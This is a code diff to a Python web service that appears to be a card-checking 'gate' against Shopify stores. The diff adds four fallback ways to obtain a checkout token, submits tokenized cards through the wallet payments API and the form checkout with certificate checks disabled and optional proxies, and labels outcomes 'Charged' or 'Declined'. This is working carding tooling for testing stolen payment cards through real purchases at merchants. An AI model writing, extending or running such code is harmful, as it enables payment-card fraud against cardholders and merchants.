@@ -44,39 +44,68 @@ async def get_product(session, site, proxy=None):
 
 
 async def get_checkout_token(session, site, variant_id, proxy=None):
-    try:
-        cart_url = f"{site}/cart/{variant_id}:1"
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-        }
-        async with session.get(
-            cart_url, proxy=proxy, timeout=TIMEOUT,
-            ssl=False, headers=headers, allow_redirects=True
-        ) as r:
-            final_url = str(r.url)
-            token_match = re.search(r"/checkouts/([a-f0-9]+)", final_url)
-            if token_match:
-                return token_match.group(1)
-    except:
-        pass
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json",
+    }
 
+    # Method 1: Add to cart then checkout
     try:
         add_url = f"{site}/cart/add.js"
         async with session.post(
             add_url,
             json={"id": int(variant_id), "quantity": 1},
-            proxy=proxy, timeout=TIMEOUT, ssl=False
+            proxy=proxy, timeout=TIMEOUT, ssl=False, headers=headers
         ) as r:
-            pass
+            pass  # ignore response, just add to cart
 
         checkout_url = f"{site}/checkout"
         async with session.get(
             checkout_url, proxy=proxy, timeout=TIMEOUT,
-            ssl=False, allow_redirects=True
+            ssl=False, allow_redirects=True, headers=headers
         ) as r:
             final_url = str(r.url)
-            token_match = re.search(r"/checkouts/([a-f0-9]+)", final_url)
+            token_match = re.search(r"/checkouts/([a-f0-9]{32})", final_url)
+            if token_match:
+                return token_match.group(1)
+    except:
+        pass
+
+    # Method 2: Cart permalink redirect
+    try:
+        cart_url = f"{site}/cart/{variant_id}:1"
+        async with session.get(
+            cart_url, proxy=proxy, timeout=TIMEOUT,
+            ssl=False, allow_redirects=True, headers=headers
+        ) as r:
+            final_url = str(r.url)
+            token_match = re.search(r"/checkouts/([a-f0-9]{32})", final_url)
+            if token_match:
+                return token_match.group(1)
+    except:
+        pass
+
+    # Method 3: checkout.js
+    try:
+        async with session.post(
+            f"{site}/cart/checkout.js",
+            proxy=proxy, timeout=TIMEOUT, ssl=False, headers=headers
+        ) as r:
+            final_url = str(r.url)
+            token_match = re.search(r"/checkouts/([a-f0-9]{32})", final_url)
+            if token_match:
+                return token_match.group(1)
+    except:
+        pass
+
+    # Method 4: checkout.json
+    try:
+        async with session.get(
+            f"{site}/checkout.json", proxy=proxy, timeout=TIMEOUT,
+            ssl=False, allow_redirects=True, headers=headers
+        ) as r:
+            final_url = str(r.url)
+            token_match = re.search(r"/checkouts/([a-f0-9]{32})", final_url)
             if token_match:
                 return token_match.group(1)
     except:
@@ -148,9 +177,7 @@ async def check_shopify(
             if not card_token:
                 return JSONResponse({"Status": False, "Response": "Failed to tokenize card", "Price": price, "Gate": "Shopify"})
 
-            # DEBUG Method 1
-            debug_info = {"checkout_token": checkout_token, "card_token_prefix": card_token[:10]}
-
+            # Method 1: Wallet payments API
             try:
                 payload = {
                     "payment": {
@@ -168,14 +195,38 @@ async def check_shopify(
                     f"{site_url}/wallets/checkouts/{checkout_token}/payments",
                     json=payload, timeout=TIMEOUT, ssl=False, headers=headers
                 ) as r:
-                    raw1 = await r.text()
-                    debug_info["method1_status"] = r.status
-                    debug_info["method1_raw"] = raw1[:300]
-                    debug_info["method1_url"] = str(r.url)
-            except Exception as e:
-                debug_info["method1_error"] = str(e)
+                    raw1 = await r.json(content_type=None)
+                    status1 = r.status
 
-            # DEBUG Method 2
+                    # Check payment result
+                    if status1 == 200:
+                        payment = raw1.get("payment", {})
+                        transaction = payment.get("transaction", {})
+                        tx_status = transaction.get("status", "")
+                        tx_message = transaction.get("message", "")
+                        error_msg = raw1.get("errors", "")
+
+                        if tx_status == "success":
+                            return JSONResponse({
+                                "Status": True,
+                                "Response": "Charged",
+                                "Message": tx_message or "Payment approved",
+                                "Price": f"${price}",
+                                "Gate": "Shopify"
+                            })
+                        elif tx_status in ["failure", "error"]:
+                            return JSONResponse({
+                                "Status": False,
+                                "Response": "Declined",
+                                "Message": tx_message or str(error_msg),
+                                "Price": f"${price}",
+                                "Gate": "Shopify"
+                            })
+
+            except Exception as e:
+                pass
+
+            # Method 2: Form-based checkout
             try:
                 form_data = {
                     "_method": "patch",
@@ -196,14 +247,42 @@ async def check_shopify(
                     data=form_data, timeout=TIMEOUT, ssl=False,
                     headers=headers2, allow_redirects=True
                 ) as r:
-                    raw2 = await r.text()
-                    debug_info["method2_status"] = r.status
-                    debug_info["method2_final_url"] = str(r.url)
-                    debug_info["method2_raw"] = raw2[:500]
-            except Exception as e:
-                debug_info["method2_error"] = str(e)
+                    raw2 = await r.json(content_type=None)
+                    final_url2 = str(r.url)
 
-            return JSONResponse({"DEBUG": debug_info, "Price": f"${price}"})
+                    checkout_data = raw2.get("checkout", {})
+                    order = raw2.get("order", {})
+
+                    if order or "thank_you" in final_url2:
+                        return JSONResponse({
+                            "Status": True,
+                            "Response": "Charged",
+                            "Message": "Order placed successfully",
+                            "Price": f"${price}",
+                            "Gate": "Shopify"
+                        })
+
+                    errors = raw2.get("errors", {})
+                    if errors:
+                        err_msg = str(errors)
+                        return JSONResponse({
+                            "Status": False,
+                            "Response": "Declined",
+                            "Message": err_msg[:200],
+                            "Price": f"${price}",
+                            "Gate": "Shopify"
+                        })
+
+            except Exception as e:
+                pass
+
+            return JSONResponse({
+                "Status": False,
+                "Response": "Unknown",
+                "Message": "Could not determine payment result",
+                "Price": f"${price}",
+                "Gate": "Shopify"
+            })
 
     except asyncio.TimeoutError:
         return JSONResponse({"Status": False, "Response": "Timeout", "Price": "-", "Gate": "Shopify"})
